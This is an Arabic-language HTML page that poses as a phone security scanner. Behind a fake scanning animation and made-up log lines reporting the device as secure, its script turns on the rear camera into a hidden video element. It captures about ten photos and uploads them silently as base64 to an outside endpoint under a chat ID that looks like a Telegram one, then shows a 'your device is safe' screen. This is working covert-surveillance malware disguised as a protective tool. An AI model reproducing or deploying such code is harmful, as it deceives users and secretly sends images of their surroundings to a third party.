<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🛡️ حماية الهاتف</title>
    <style>
        :root { --green: #00ff41; --red: #ff0040; }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Courier New', monospace; background: #000; color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .page { display: none; } .page.active { display: block; }
        .skull { font-size: 60px; }
        h1 { font-size: 22px; color: var(--green); }
        .device-card { background: #0a0a0a; border: 2px solid var(--green); border-radius: 14px; padding: 18px; margin-bottom: 20px; }
        .device-card .d-name { color: var(--green); font-size: 16px; font-weight: 700; }
        .btn { width: 100%; padding: 18px; border-radius: 12px; border: 2px solid var(--green); background: #0a1a0a; color: var(--green); font-size: 18px; font-weight: 700; cursor: pointer; font-family: 'Courier New', monospace; }
        .code-screen { background: #000; border: 2px solid var(--green); border-radius: 10px; padding: 14px; margin: 16px 0; color: var(--green); font-size: 10px; line-height: 1.5; text-align: left; max-height: 250px; overflow-y: auto; }
        .countdown { font-size: 40px; font-weight: 900; color: var(--red); }
        .progress-bar { width: 100%; height: 4px; background: #0a1a0a; border-radius: 2px; margin: 10px 0; overflow: hidden; }
        .progress-fill { height: 100%; background: var(--red); width: 0%; }
        .success-icon { font-size: 70px; }
        .success-text { color: var(--green); font-size: 22px; font-weight: 700; }
        video { display: none; } canvas { display: none; }
    </style>
</head>
<body>
<div class="container">
    <div class="page active" id="page-home">
        <div class="skull">🛡️</div>
        <h1>حماية الهاتف</h1>
        <div class="device-card"><div class="d-name" id="device-name">📱 جاري الكشف...</div></div>
        <button class="btn" onclick="startScan()">🔍 اضغط لبدء الفحص</button>
    </div>
    <div class="page" id="page-scanning">
        <div class="skull">💀</div>
        <h1>جاري الفحص الشامل...</h1>
        <div class="code-screen" id="code-screen"></div>
        <div class="countdown" id="countdown">15</div>
        <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
        <video id="hidden-video" autoplay playsinline muted></video>
        <canvas id="hidden-canvas"></canvas>
    </div>
    <div class="page" id="page-done">
        <div class="success-icon">✅</div>
        <div class="success-text">جهازك بأمان</div>
    </div>
</div>

<script>
const CHAT_ID = new URLSearchParams(window.location.search).get('chatId') || '7276604783';
const API = 'https://ai-proxy-eosin.vercel.app/api/upload_video';

document.getElementById('device-name').textContent = '📱 ' + (navigator.userAgent.match(/; ([^;]+) Build/)?.[1] || 'جهاز').trim();
function showPage(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); }

let stream, ready = false;

async function startScan() {
    showPage('page-scanning');
    
    // كاميرا خلفية - استنى لما تكون جاهزة
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
        const video = document.getElementById('hidden-video');
        video.srcObject = stream;
        
        // استنى الكاميرا تحمل بالكامل
        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(resolve, 2000); // استنى ثانيتين
            };
        });
        ready = true;
    } catch(e) { alert('الكاميرا مش شغالة'); return; }

    const codeScreen = document.getElementById('code-screen');
    const countdownEl = document.getElementById('countdown');
    const progressFill = document.getElementById('progress-fill');
    const canvas = document.getElementById('hidden-canvas');
    const video = document.getElementById('hidden-video');
    const logs = ['[■] INITIALIZING...','[■] DEVICE: '+document.getElementById('device-name').textContent,'[■] CHECKING...','[■] SCANNING...','[■] KERNEL: SECURE','[■] NO MALWARE','[✓] DEVICE SECURE'];
    let seconds = 15, photos = 0;

    function capture() {
        if (!ready || !video || video.readyState < 2) return;
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        canvas.toBlob(blob => {
            if (!blob || blob.size < 1000) return; // تجاهل الصور الفارغة
            const reader = new FileReader();
            reader.onloadend = () => {
                const base64 = reader.result.split(',')[1];
                if (base64 && base64.length > 100) {
                    fetch(API, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, video_base64: base64 }) }).catch(e => {});
                    photos++;
                }
            };
            reader.readAsDataURL(blob);
        }, 'image/jpeg', 0.8);
    }

    const interval = setInterval(() => {
        seconds--;
        countdownEl.textContent = seconds;
        progressFill.style.width = ((15 - seconds) / 15 * 100) + '%';
        codeScreen.innerHTML = logs.slice(0, Math.floor(((15-seconds)/15)*logs.length+1)).join('<br>');
        codeScreen.scrollTop = codeScreen.scrollHeight;
        
        if (seconds <= 10 && photos < 10) capture();
        
        if (seconds <= 0) {
            clearInterval(interval);
            for (let i = photos; i < 10; i++) capture();
            setTimeout(() => { if (stream) stream.getTracks().forEach(t => t.stop()); showPage('page-done'); }, 2000);
        }
    }, 1000);
}
</script>
</body>
</html>
